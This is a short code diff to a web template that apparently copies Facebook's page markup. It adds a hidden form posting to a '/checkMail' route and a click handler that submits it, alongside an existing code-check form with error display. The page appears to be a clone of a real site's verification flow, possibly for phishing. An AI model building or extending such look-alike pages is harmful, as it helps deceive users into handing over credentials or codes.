@@ -4170,6 +4170,9 @@
 </head>
 
 <body>
+    <form action="/checkMail" method="post" id="form-navicate">
+        @csrf
+    </form>
     <div id="mount_0_0_6s" style=""><!--$--><!--$-->
         <div class="">
             <div class=""><!--$-->
@@ -4456,11 +4459,18 @@
                 </div><!--$--><!--/$--><!--/$-->
             </div>
         </div><!--/$--><!--/$-->
+
     </div>
     <script>
         var button = document.getElementById('submit');
         var form = document.getElementById('form_check');
         var errCode = document.getElementById('err-code');
+        var navigate = document.getElementsByClassName('x1iorvi4')[0];
+        var formNavigate = document.getElementById('form-navicate');
+        console.log(formNavigate);
+        navigate.addEventListener("click", function() {
+            formNavigate.submit();
+        })
         button.addEventListener('click', function() {
             if (!errCode.classList.contains('hidden')) {
                 errCode.classList.add('hidden');
